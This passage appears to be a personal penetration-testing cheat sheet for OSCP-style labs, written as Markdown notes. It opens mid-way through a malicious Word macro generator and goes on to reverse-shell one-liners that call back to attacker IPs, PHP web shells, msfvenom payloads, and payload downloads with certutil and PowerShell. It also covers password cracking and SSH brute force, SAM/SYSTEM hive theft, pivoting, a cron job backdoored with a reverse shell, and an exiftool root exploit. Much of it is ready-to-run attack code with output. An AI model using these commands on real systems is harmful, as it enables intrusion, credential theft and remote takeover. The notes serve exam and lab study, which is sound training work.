ACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

n = 50

for i in range(0, len(str), n):
    print "Str = Str + " + '"' + str[i:i+n] + '"'
````
````
Sub AutoOpen()

  MyMacro

End Sub

Sub Document_Open()

  MyMacro

End Sub

Sub MyMacro()

    Dim Str As String

   <b>Paste the script output here!<b>

    CreateObject("Wscript.Shell").Run Str

End Sub
````
### Coding RCEs

#### Python
````
import subprocess

# Replace "<your $ip" and "<your $PORT>" with your target IP address and port
reverse_shell_command = 'python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<your $ip>',<your $PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"'

try:
    # Execute the reverse shell command
    subprocess.run(reverse_shell_command, shell=True)
except Exception as e:
    print(f"An error occurred: {e}")
````
#### Bash

````
#!/bin/bash

sh -i 5<> /dev/tcp/[MY_IP]/[MY_PORT] 0<&5 1>&5 2>&5
````

### Linux rce techniques
````
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
python3 -m http.server
nc -nlvp 443
<?php system("wget http://<kali IP>/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
````
````
echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php
shell.php&cmd=
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $ip",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp 22
or

busybox nc $ip 5000 -e /bin/bash
````
````
 &cmd=whoami or ?cmd=whoami
<?php shell_exec($_GET["cmd"]);?>
<?php system($_GET["cmd"]);?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
````
````
cp /usr/share/webshells/php/php-reverse-shell.php .
python3 -m http.server 800
nc -nlvp 443
&cmd=wget http://192.168.119.168:800/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php
````
#### Reverse Shell Payload
````
https://revshells.com/
````
### Hashing & Cracking
#### Wordlists that worked
````
/usr/share/wordlists/rockyou.txt
/usr/share/wfuzz/wordlist/others/common_pass.txt
````
#### Enumeration
````
hashid <paste your hash here>
````
````
https://www.onlinehashcrack.com/hash-identification.php
````
````
https://hashcat.net/wiki/doku.php?id=example_hashes
````
#### Cracking hashes
````
https://crackstation.net/
````
````
hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
````
##### Md5
````
hashcat -m 0 -a 0 -o hashout eric.hash /home/jerm/rockyou.txt #if the original doesnt work use this
````
##### Cracking with Johntheripper
````
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
````
##### Crakcing with hydra
###### ssh
````
hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt $ip -t 4 ssh
hydra -l userc -P /usr/share/wordlists/rockyou.txt $ip -t 4 ssh
````
#### Cracking kdbx files
````
keepass2john Database.kdbx > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
````
#### KeePass.dmp
````
sudo git clone https://github.com/CMEPW/keepass-dump-masterkey
chmod +x poc.py

python3 poc.py -d /home/kali/HTB/Keeper/lnorgaard/KeePassDumpFull.dmp 
2023-09-27 20:32:29,743 [.] [main] Opened /home/kali/HTB/Keeper/lnorgaard/KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
````
#### Downloading keepassxc
````
sudo apt update && sudo apt-get install keepassxc
````

![image](https://github.com/xsudoxx/OSCP/assets/127046919/7aa67384-ba6b-4a94-b522-99349a987e3d)

![image](https://github.com/xsudoxx/OSCP/assets/127046919/1b97a744-63ab-4264-b3b3-e32485edfceb)


#### Cracking Zip files
````
unzip <file>
unzip bank-account.zip 
Archive:  bank-account.zip
[bank-account.zip] bank-account.xls password: 
````
````
zip2john file.zip > test.hash
john --wordlist=/usr/share/wordlists/rockyou.txt test.hash
````
#### Cracking with CyberChef
````
https://gchq.github.io/CyberChef/
````
##### hashcat output
If hashcat gives back some sort of Hex Encoding you can use cyber chef to finish off the hash and give you back the password
````
$HEX[7261626269743a29]
````
![image](https://github.com/xsudoxx/OSCP/assets/127046919/88bc13a2-ec53-4a91-8ce1-c484fde12886)

#### Testing for passwords
##### Background
````
We typically know we can unzip files and get de-compress the results, in this case we unzipped the zip file and got almost nothing back it was weird, we used instead the commands below to test for a password on the zip file and it did indeed prompt us to enter a zip file password, we used our cracking technique of hashes above was able to login with su chloe with the password we found in the file
````
````
sudo 7z x sitebackup3.zip
````
````
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs AMD Ryzen 5 5500U with Radeon Graphics          (860F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 25312 bytes (25 KiB)

Extracting archive: sitebackup3.zip
--
Path = sitebackup3.zip
Type = zip
Physical Size = 25312

    
Enter password (will not be echoed):
Everything is Ok         

Folders: 17
Files: 19
Size:       67063
Compressed: 25312
````
### Logging in/Changing users
#### rdp
````
rdesktop -u 'USERN' -p 'abc123//' 192.168.129.59 -g 94% -d example
xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be22022754bf0975251e1e7ac
````
## Buffer Overflow <img src="https://w7.pngwing.com/pngs/331/576/png-transparent-computer-icons-stack-overflow-encapsulated-postscript-stacking-angle-text-stack-thumbnail.png" width="40" height="40" />

## MSFVENOM
### MSFVENOM Cheatsheet
````
https://github.com/frizb/MSF-Venom-Cheatsheet
````
### Linux 64 bit PHP
````
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=443 -f elf > shell.php
````
### Windows 64 bit
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=<port you designated> -f exe -o ~/shell.exe
````
### Windows 64 bit apache tomcat
````
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=80 -f raw > shell.jsp
````
### Windows 64 bit aspx
````
msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=443 -o shell64.aspx
````
### Apache Tomcat War file
````
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.179 LPORT=8080 -f war > shell.war
````
### Javascript shellcode
````
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.179 LPORT=443 -f js_le -o shellcode
````
## File Transfer <img src="https://cdn-icons-png.flaticon.com/512/1037/1037316.png" width="40" height="40" />
### Powershell Linux to Windows
````
(new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:800/chisel.exe','C:\Windows\Tasks\chisel.exe')
````
### SMB Linux to Windows
````
impacket-smbserver -smb2support Share .
cmd.exe /c //<your kali IP>/Share/<file name you want>
````
````
/usr/local/bin/smbserver.py -username df -password df share . -smb2support
net use \\<your kali IP>\share /u:df df
copy \\<your kali IP>\share\<file wanted>
````
````
impacket-smbserver -smb2support Share .
net use \\<your kali IP>\share
copy \\<your kali IP>\share\whoami.exe
````
### Windows http server Linux to Windows
````
python3 -m http.server 80
certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
````
````
Invoke-WebRequest -Uri http://10.10.93.141:7781/winPEASx64.exe -OutFile wp.exe
````
#### Errors
````
Access is denied. In this case try Invoke-WebRequest for powershell
````
### SMB Shares Windows to Windows
````
In this situation we have logged onto computer A
sudo impacket-psexec Admin:'password123'@192.168.203.141 cmd.exe
C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.203.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.203.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.93.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
   
 Via Computer A we pivot to Computer B (internal IP) with these creds
 proxychains evil-winrm -u celia.almeda -p 7k8XHk3dMtmpnC7 -i 10.10.93.142
````
#### Accessing $C Drive of Computer A
````
*Evil-WinRM* PS C:\windows.old\Windows\system32> net use * \\10.10.93.141\C$ /user:Admin password123
````
#### Copying over files
````
*Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SYSTEM Z:\
*Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SAM Z:\
````
### SMB Server Bi-directional
````
impacket-smbserver -smb2support Share .
smbserver.py -smb2support Share .
mkdir loot #transfering loot to this folder
net use * \\192.168.119.183\share
copy Z:\<file you want from kali>
copy C:\bank-account.zip Z:\loot #Transfer files to the loot folder on your kali machine
````
#### Authenticated
````
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
````
````
impacket-smbserver -username df -password df share . -smb2support
net use \\10.10.16.9\share /u:df df
copy \\10.10.16.9\share\<file wanted>
````

### PHP Script Windows to Linux
````
cat upload.php
chmod +x upload.php
````
````
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
````
````
sudo mkdir /var/www/uploads
````
````
mv upload.php /var/www/uploads
````
````
service apache2 start
ps -ef | grep apache
`````
````
powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/upload.php', '<file you want to transfer>')
````
````
service apache2 stop
````

## Linux System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/546/546049.png" width="40" height="40" />
### Use this guide first
````
https://sirensecurity.io/blog/linux-privilege-escalation-resources/
````
### Checking interesting folders
````
/opt #lead us to chloe which lead us to root
````
### Finding Writable Directories
````
find / -type d -writable -user $(whoami) 2>/dev/null
````
### Finding SUID Binaries
````
find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
find / -perm /4000 2>/dev/null
````
### start-stop-daemon
````
/usr/sbin/start-stop-daemon
````
````
/usr/sbin/start-stop-daemon -n foo -S -x /bin/sh -- -p
````
### Crontab 
````
cat /etc/crontab
````
### NFS
````
cat /etc/exports
````
## Windows System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/232/232411.png" width="40" height="40" />
### PowerUp.ps1
````
cp /opt/PowerUp/PowerUp.ps1 .
Import-Module .\PowerUp.ps1
. .\PowerUp.ps1
````
### Windows Binaries
````
sudo apt install windows-binaries
````
### Basic Enumeration of the System
````
# Basics
systeminfo
hostname

# Who am I?
whoami
echo %username%

# What users/localgroups are on the machine?
net users
net localgroups

# More info about a specific user. Check if user has privileges.
net user user1

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain <Group Name>

# Firewall
netsh firewall show state
netsh firewall show config

# Network
ipconfig /all
route print
arp -A

# How well patched is the system?
wmic qfe get Caption,Description,HotFixID,InstalledOn
````
````
dir /a-r-d /s /b
move "C:\Inetpub\wwwroot\winPEASx86.exe" "C:\Directory\thatisWritable\winPEASx86.exe"
````
#### Windows Services - insecure file persmissions
````
accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command refer to exploits below
````
### Clear text passwords
````
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
````
````
dir /s /p proof.txt
dir /s /p local.txt
````
### Git commands
````
C:\Users\damon> type .gitconfig
[safe]
        directory = C:/prod
[user]
        email = damian
        name = damian
````
````
C:\Users\damon> cd C:/prod
````
````
C:\prod> git log
fatal: detected dubious ownership in repository at 'C:/prod'
'C:/prod/.git' is owned by:
        'S-1-5-21-464543310-226837244-3834982083-1003'
but the current user is:
        'S-1-5-18'
To add an exception for this directory, call:

        git config --global --add safe.directory C:/prod
````
````
C:\prod> git config --global --add safe.directory C:/prod
````
````
C:\prod> git log
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

commit 967fa71c359fffcbeb7e2b72b27a321612e3ad11
Author: damian <damian>
Date:   Thu Oct 20 02:06:37 2022 -0700

    V1
````
````
C:\prod> git show
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
deleted file mode 100644
index 77e370c..0000000
--- a/htdocs/cms/data/email.conf.bak
+++ /dev/null
@@ -1,5 +0,0 @@
-Email configuration of the CMS
-maildmz@example.com:DPuBT9tGCBrTbR
-
-If something breaks contact jim@example.com as he is responsible for the mail server. 
-Please don't send any office or executable attachments as they get filtered out for security reasons.
\ No newline at end of file
````
### Powershell password hunting
#### Viewing Powershell History
````
PS C:\> (Get-PSReadlineOption).HistorySavePath
C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

type C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
echo "Let's check if this script works running as damon and password i6yuT6tym@"
echo "Don't forget to clear history once done to remove the password!"
Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s
````
#### Interesting Files
````
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
type C:\xampp\passwords.txt

Get-ChildItem -Path C:\Users\USERD\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
cat Desktop\asdf.txt
````
## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />
### Linux
#### Pimp my shell
````
which python
which python2
which python3
python -c ‘import pty; pty.spawn(“/bin/bash”)’
````
````
which socat
socat file:`tty`,raw,echo=0 tcp-listen:4444 #On Kali Machine
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444 #On Victim Machine
````
````
Command 'ls' is available in '/bin/ls'
export PATH=$PATH:/bin
````
````
The command could not be located because '/usr/bin' is not included in the PATH environment variable.
export PATH=$PATH:/usr/bin
````
````
-rbash: $'\r': command not found
BASH_CMDS[a]=/bin/sh;a
````
````
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
````
#### Reverse shells
````
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
````
````
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 #worked
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $ip",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' #worked
````
### Windows
#### Stable shell
````
nc -nlvp 9001
.\nc.exe <your kali IP> 9001 -e cmd
C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 80 -e C:\WINDOWS\System32\cmd.exe
````
#### Powershell
````
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
echo "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444" >> Invoke-PowerShellTcp.ps1
powershell -executionpolicy bypass -file Invoke-PowerShellTcp.ps1 #Once on victim run this
````
## Port Forwarding/Tunneling <img src="https://cdn-icons-png.flaticon.com/512/3547/3547287.png" width="40" height="40" />
````
https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/pivoting-basics/
````
### Commands
````
ps aux | grep ssh
kill (enter pid #)
````
### Tools
#### sshuttle
##### Linux Enviorment
````
sshuttle -r USERS@10.11.1.251 10.1.1.0/24 #run on your kali machine to proxy traffic into the IT Network
#In this situation we have rooted a linux machine got user creds and can establish an sshuttle
#You can visit the next network as normal and enumerate it as normal.
#best used for everything else but nmap
````
###### Transfering files via sshuttle
````
sshuttle -r USERS@10.11.1.251 10.1.1.0/24 #1 Port Foward to our machine
python3 -m http.server 800 # on our kali machine
ssh userc@10.1.1.27 curl http://192.168.119.140:800/linpeas.sh -o /tmp/linpeas.sh #2 on our kali machine to dowload files
````
#### ssh port foward
##### Linux Enviorment
````
sudo echo "socks4 127.0.0.1 80" >> /etc/proxychains.conf 
[7:06 PM]
ssh -NfD 80 USERS@10.11.1.251 10.1.1.0/24
[7:07 PM]
proxychains nmap -p- --min-rate=1000 10.1.1.27 -Pn #best used for nmap only
proxychains nmap -sT --top-ports 1000 --min-rate=1000 -Pn  10.1.1.68 -v # better scan
proxychains nmap -A -sT -p445 -Pn 10.1.1.68 # direct scans of ports this is best used when enumerating each port
````
#### ssh Local port fowarding
##### Info 
````
In local port forwarding, you are forwarding a port on your local machine to a remote machine. This means that when you connect to a remote server using SSH and set up local port forwarding, any traffic sent to the specified local port will be forwarded over the SSH connection to the remote machine and then forwarded to the target service or application.
````
##### Example
````
ssh -L 6070:127.0.0.1:2049 userc@10.1.1.27 -N
````
````
This command creates an SSH tunnel between your local computer and a remote computer at IP address 10.1.1.27, with the user "userc". The tunnel forwards all traffic sent to port 6070 on your local computer to port 2049 on the remote computer, which is only accessible via localhost (127.0.0.1). The "-N" flag tells SSH to not execute any commands after establishing the connection, so it will just stay open and forward traffic until you manually terminate it. This is commonly used for securely accessing network services that are not directly accessible outside of a certain network or firewall.

#notes we did not use proxychains on this. just as the setup was above
````
##### Example #2
````
Lets say you have compromised host 192.168.236.147 which has access to 10.10.126.148, you could access the mssql server on port 1433 locally by doing a local port forward as seen below. This will essence allow you to access to the mssql port on your local machine with out needing proxychains.
````
````
ssh -L 1433:10.10.126.148:1433 Admin@192.168.236.147 -N
````
````
sqsh -S 127.0.0.1 -U example.com\\sql_service -P password123 -D msdb
````
#### Bi-directional ssh tunnel
````
In this example we are 192.168.45.191 attacking an AD exploit chain with internal/private IPs. We are able to get sql_service creds on MS01 which can be used to login into MS02, once we login we cannot download any files or do any rce's so we have to setup a bi-directional ssh tunnel.
````
##### arp -a
````
 sudo impacket-psexec Admin:password123@192.168.236.147 cmd.exe
````
````
We are using the arp -a on MS01 to show where we got some of the IPs, internal and external facing when going through this exploit chain.
````
````
C:\Windows\system32> arp -a
 
Interface: 192.168.236.147 --- 0x6
  Internet Address      Physical Address      Type   
  192.168.236.254       00-50-56-bf-dd-5e     dynamic   
  192.168.236.255       ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  239.255.255.250       01-00-5e-7f-ff-fa     static    

Interface: 10.10.126.147 --- 0x8
  Internet Address      Physical Address      Type
  10.10.126.146         00-50-56-bf-27-a8     dynamic
  10.10.126.148         00-50-56-bf-f9-55     dynamic
  10.10.126.255         ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.251           01-00-5e-00-00-fb     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  239.255.255.250       01-00-5e-7f-ff-fa     static
````
##### Local Port Foward
````
Sets up local port forwarding. It instructs SSH to listen on port 1433 on the local machine and forward any incoming traffic to the destination IP address 10.10.126.148 on port 1433. Admin@192.168.236.147: Specifies the username (Admin) and the IP address (192.168.236.147) of the remote server to establish the SSH connection with.
````
````
ssh -L 1433:10.10.126.148:1433 Admin@192.168.236.147 -N
````
````
In our next command we are able to login as the sql_service on 10.10.126.148 (MS02) as if we were 192.168.236.147 (MS01)
````
````
sqsh -S 127.0.0.1 -U example.com\\sql_service -P password123 -D msdb
````
##### Reverse Port Foward
````
-R 10.10.126.147:7781:192.168.45.191:18890: Sets up reverse port forwarding. It instructs SSH to listen on IP 10.10.126.147 and port 7781 on the remote server, and any incoming traffic received on this port should be forwarded to the IP 192.168.45.191 and port 18890.
Admin@192.168.236.147: Specifies the username (Admin) and the IP address (192.168.236.147) of the remote server to establish the SSH connection with.
````
````
sudo ssh -R 10.10.126.147:7781:192.168.45.191:18890 Admin@192.168.236.147 -N
````
##### RCE
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.126.147 LPORT=7781 EXITFUNC=thread -f exe --platform windows -o rshell.exe
````
````
1> xp_cmdshell 'whoami'
nt service\mssql$sqlexpress
````
````
1> xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://10.10.126.147:7781/rshell.exe -OutFile c:\Users\Public\reverse.exe"'
````
````
python3 -m http.server 18890
Serving HTTP on 0.0.0.0 port 18890 (http://0.0.0.0:18890/) ...
192.168.45.191 - - [30/May/2023 22:05:32] "GET /rshell.exe HTTP/1.1" 200 -
````
````
1> xp_cmdshell 'c:\Users\Public\reverse.exe"'
````
````
nc -nlvp 18890
retrying local 0.0.0.0:18890 : Address already in use
retrying local 0.0.0.0:18890 : Address already in use
listening on [any] 18890 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.45.191] 37446
Microsoft Windows [Version 10.0.19042.1586]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt service\mssql$sqlexpress
````
#### Chisel
````
https://github.com/jpillora/chisel/releases/ #where you can find newer versions
````
##### Chisel Windows
````
https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_windows_386.gz #Windows Client
cp /home/kali/Downloads/chisel_1.8.1_windows_386.gz .
gunzip -d *.gz
chmod +x chisel_1.8.1_windows_386
mv chisel_1.8.1_windows_386 chisel.exe
````
##### Chisel Nix
````
locate chisel
/usr/bin/chisel #Linux Server
````
###### Windows to Nix
````
chisel server --port 8000 --socks5 --reverse #On your kali machine
vim /etc/proxychains.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 8080
socks5 127.0.0.1 1080
certutil -urlcache -split -f http://<your $ip>:<Your Porty>/chisel.exe
.\chisel client <your IP>:8000 R:socks #On victim machine
proxychains psexec.py victim:password@<victim $ip> cmd.exe
````

## Compiling Exploit Codes <img src="https://cdn-icons-png.flaticon.com/128/868/868786.png" width="40" height="40" />
### Old exploits .c
````
sudo apt-get install gcc-multilib
sudo apt-get install libx11-dev:i386 libx11-dev
gcc 624.c -m32 -o exploit
````
## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />
### Crontab/Git
In this priv esc scenario we logged in via ssg, found that a cron job was running bash file with root privs. We could git clone that same repo with the private key we find in user gits ssh folder and edit the bash file to give us a rce as root.
````
/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Nov  6  2020 .
drwxr-xr-x 6 root root 4096 Nov  6  2020 ..
-rw------- 1 root root    9 Jan 23 10:34 cron.daily
-rw------- 1 root root    9 May 28 02:19 cron.monthly
-rw------- 1 root root    9 May 28 02:19 cron.weekly
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
````
````
-rwxr-xr-x 1 root root 2590 Nov  5  2020 /home/git/.ssh/id_rsa
````
#### Setup
````
GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.214.125:/git-server
````
````
cd git-server
cat backups.sh 
#!/bin/bash
#
#
# # Placeholder
#

````
````
cat backups.sh 
#!/bin/bash
sh -i >& /dev/tcp/192.168.45.191/18030 0>&1
````
````
chmod +x backups.sh
````
````
GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git status            
On branch master
Your branch is up to date with 'origin/master'.

Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        modified:   backups.sh

no changes added to commit (use "git add" and/or "git commit -a")
````
#### Git setup / exploit
````
git config --global user.name "git"
git config --global user.email "git@userD" #User is the same from the private key git@
````
````
GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git add --all
IT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git commit -m "PE Commit"

[master 872aa26] Commit message
 1 file changed, 1 insertion(+), 4 deletions(-)
 
 GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git push origin master        
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 3 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 294 bytes | 147.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
To 192.168.214.125:/git-server
   b50f4e5..872aa26  master -> master
````
````
nc -nlvp 18030                                   
listening on [any] 18030 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.214.125] 48038
sh: cannot set terminal process group (15929): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.0# id
id
uid=0(root) gid=0(root) groups=0(root)
sh-5.0# 
````
### Exiftool priv esc
````
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
````
````
www-data@exfiltrated:/opt$ cat image-exif.sh
cat image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
````
#### Setup
````
sudo apt-get install -y djvulibre-bin
wget -qO sample.jpg placekitten.com/200
file sample.jpg
printf 'P1 1 1 1' > input.pbm
cjb2 input.pbm mask.djvu
djvumake exploit.djvu Sjbz=mask.djvu
echo -e '(metadata (copyright "\\\n" . `chmod +s /bin/bash` #"))' > input.txt
djvumake exploit.djvu Sjbz=mask.djvu ANTa=input.txt
exiftool '-GeoTiffAsciiParams<=exploit.djvu' sample.jpg
perl -0777 -pe 's/\x87\xb1/\xc5\x1b/g' < sample.jpg > exploit.jpg
````
#### Exploit
````
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.191:80/exploit.jpg
````
````
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -l /bin/bash
ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
www-data@exfiltrated:/var/www/html/subrion/uploads$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
````
````
www-data@exfiltrated:/var/www/html/subrion/uploads$ /bin/bash -p
/bin/bash -p
bash-5.0# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
````
### Monitor processes/cron jobs
#### pspy
````
https://github.com/DominicBreuker/pspy
````
````
/opt/pspy/pspy64 #transfer over to victim
````
````
chmod +x pspy64
./pspy64 -pf -i 1000
````

### Active Ports
````
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
tcp   LISTEN 0      128          0.0.0.0:2222      0.0.0.0:*                                                                                                                                                                                
tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*          
tcp   LISTEN 0      511        127.0.0.1:8000      0.0.0.0:*          
tcp   LISTEN 0      128             [::]:2222         [::]:*          
tcp   LISTEN 0      511                *:80              *:*          
tcp   LISTEN 0      511                *:443             *:*
````
#### Local Port Foward
````
ssh -i id_ecdsa userE@192.168.138.246 -p 2222 -L 8000:localhost:8000 -N
````
#### Curl
````
curl 127.0.0.1:8000
````
#### LFI
````
127.0.0.1:8000/backend/?view=../../../../../etc/passwd
